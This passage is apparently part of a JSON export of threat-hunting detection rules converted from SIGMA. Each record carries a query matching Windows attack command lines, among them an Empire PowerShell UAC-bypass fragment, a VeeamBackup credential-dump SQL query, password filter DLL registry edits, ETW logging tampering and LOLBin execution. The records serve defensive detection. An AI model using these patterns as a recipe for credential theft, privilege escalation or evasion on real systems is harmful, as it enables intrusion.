            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious child processes of the SQLServer process. This could indicate potential RCE or SQL Injection.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1505",
                "t1190"
            ],
            "name": "Suspicious Child Process Of SQL Server",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\sqlservr.exe\" and (tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\netstat.exe\" or tgt.process.image.path contains \"\\nltest.exe\" or tgt.process.image.path contains \"\\ping.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\systeminfo.exe\" or tgt.process.image.path contains \"\\tasklist.exe\" or tgt.process.image.path contains \"\\wsl.exe\")) and (not (src.process.image.path contains \"C:\\Program Files\\Microsoft SQL Server\\\" and src.process.image.path contains \"DATEV_DBENGINE\\MSSQL\\Binn\\sqlservr.exe\" and tgt.process.image.path=\"C:\\Windows\\System32\\cmd.exe\" and tgt.process.cmdline contains \"\\\"C:\\Windows\\system32\\cmd.exe\\\" \"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 163
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects file execution using the msdeploy.exe lolbin",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Execute Files with Msdeploy.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"verb:sync\" and tgt.process.cmdline contains \"-source:RunCommand\" and tgt.process.cmdline contains \"-dest:runCommand\") and tgt.process.image.path contains \"\\msdeploy.exe\")) | columns ComputerName,tgt.process.user,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 164
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects dropping of dll files in system32 that may be used to retrieve user credentials from LSASS",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1556"
            ],
            "name": "Dropping Of Password Filter DLL",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" and tgt.process.cmdline contains \"scecli\\0\" and tgt.process.cmdline contains \"reg add\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 165
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a potentially suspicious execution of a parent process located in the \"\\Users\\Public\" folder executing a child process containing references to shell or scripting binaries and commandlines.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564",
                "t1059"
            ],
            "name": "Potentially Suspicious Execution From Parent Process In Public Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \":\\Users\\Public\\\" and ((tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.cmdline contains \"bitsadmin\" or tgt.process.cmdline contains \"certutil\" or tgt.process.cmdline contains \"cscript\" or tgt.process.cmdline contains \"mshta\" or tgt.process.cmdline contains \"powershell\" or tgt.process.cmdline contains \"regsvr32\" or tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"wscript\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 166
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects changes to environment variables related to ETW logging via the CommandLine.\nThis could indicate potential adversaries stopping ETW providers recording loaded .NET assemblies.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "ETW Logging Tamper In .NET Processes Via CommandLine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"COMPlus_ETWEnabled\" or tgt.process.cmdline contains \"COMPlus_ETWFlags\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 167
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Abusing Winsat Path Parsing - Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\")) and src.process.image.path contains \"\\AppData\\Local\\Temp\\system32\\winsat.exe\" and src.process.cmdline contains \"C:\\Windows \\system32\\winsat.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 168
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon child processes spawning from \"sigverif.exe\", which could indicate potential abuse of the latter as a living of the land binary in order to proxy execution.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
            "name": "Uncommon Sigverif.EXE Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\sigverif.exe\" and (not (tgt.process.image.path in (\"C:\\Windows\\System32\\WerFault.exe\",\"C:\\Windows\\SysWOW64\\WerFault.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 169
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects process execution from a fake recycle bin folder, often used to avoid security solution.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Process Execution From Fake Recycle.Bin Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"RECYCLERS.BIN\\\" or tgt.process.image.path contains \"RECYCLER.BIN\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 170
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an attempt to leverage dnscmd.exe to enumerate the DNS zones of a domain. DNS zones used to host the DNS records for a particular domain.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1543"
            ],
            "name": "Potential Discovery Activity Via Dnscmd.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\dnscmd.exe\" and (tgt.process.cmdline contains \"/enumrecords\" or tgt.process.cmdline contains \"/enumzones\" or tgt.process.cmdline contains \"/ZonePrint\" or tgt.process.cmdline contains \"/info\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 171
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects RDP session hijacking by using MSTSC shadowing",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1563"
            ],
            "name": "Potential MSTSC Shadowing Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"noconsentprompt\" and tgt.process.cmdline contains \"shadow:\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 172
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects some Empire PowerShell UAC bypass methods",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "HackTool - Empire PowerShell UAC Bypass",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update)\" or tgt.process.cmdline contains \" -NoP -NonI -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update);\")) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 173
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects shell spawned from Java host process, which could be a sign of exploitation (e.g. log4j exploitation)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Shell Process Spawned by Java.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\java.exe\" and (tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\")) and (not (src.process.image.path contains \"build\" and tgt.process.cmdline contains \"build\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 174
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects dump of credentials in VeeamBackup dbo",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1005"
            ],
            "name": "VeeamBackup Database Credentials Dump Via Sqlcmd.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\sqlcmd.exe\" and (tgt.process.cmdline contains \"SELECT\" and tgt.process.cmdline contains \"TOP\" and tgt.process.cmdline contains \"[VeeamBackup].[dbo].[Credentials]\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 175
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the modification of an existing service in order to execute an arbitrary payload when the service is started or killed as a potential method for persistence.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1543",
                "t1574"
            ],
            "name": "Potential Persistence Attempt Via Existing Service Tampering",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"sc \" and tgt.process.cmdline contains \"config \" and tgt.process.cmdline contains \"binpath=\") or (tgt.process.cmdline contains \"sc \" and tgt.process.cmdline contains \"failure\" and tgt.process.cmdline contains \"command=\")) or (((tgt.process.cmdline contains \"reg \" and tgt.process.cmdline contains \"add \" and tgt.process.cmdline contains \"FailureCommand\") or (tgt.process.cmdline contains \"reg \" and tgt.process.cmdline contains \"add \" and tgt.process.cmdline contains \"ImagePath\")) and (tgt.process.cmdline contains \".sh\" or tgt.process.cmdline contains \".exe\" or tgt.process.cmdline contains \".dll\" or tgt.process.cmdline contains \".bin$\" or tgt.process.cmdline contains \".bat\" or tgt.process.cmdline contains \".cmd\" or tgt.process.cmdline contains \".js\" or tgt.process.cmdline contains \".msh$\" or tgt.process.cmdline contains \".reg$\" or tgt.process.cmdline contains \".scr\" or tgt.process.cmdline contains \".ps\" or tgt.process.cmdline contains \".vb\" or tgt.process.cmdline contains \".jar\" or tgt.process.cmdline contains \".pl\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 176
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "F-Secure C3 produces DLLs with a default exported StartNodeRelay function.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "HackTool - F-Secure C3 Load by Rundll32",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"rundll32.exe\" and tgt.process.cmdline contains \".dll\" and tgt.process.cmdline contains \"StartNodeRelay\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 177
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "This rule detects execution of PowerShell scripts located in the \"C:\\Users\\Public\" folder",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Execution of Powershell Script in Public Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and (tgt.process.cmdline contains \"-f C:\\Users\\Public\" or tgt.process.cmdline contains \"-f \\\"C:\\Users\\Public\" or tgt.process.cmdline contains \"-f %Public%\" or tgt.process.cmdline contains \"-fi C:\\Users\\Public\" or tgt.process.cmdline contains \"-fi \\\"C:\\Users\\Public\" or tgt.process.cmdline contains \"-fi %Public%\" or tgt.process.cmdline contains \"-fil C:\\Users\\Public\" or tgt.process.cmdline contains \"-fil \\\"C:\\Users\\Public\" or tgt.process.cmdline contains \"-fil %Public%\" or tgt.process.cmdline contains \"-file C:\\Users\\Public\" or tgt.process.cmdline contains \"-file \\\"C:\\Users\\Public\" or tgt.process.cmdline contains \"-file %Public%\"))) | columns tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 178
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "The OpenWith.exe executes other binary",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "OpenWith.exe Executes Specified Binary",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\OpenWith.exe\" and tgt.process.cmdline contains \"/c\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
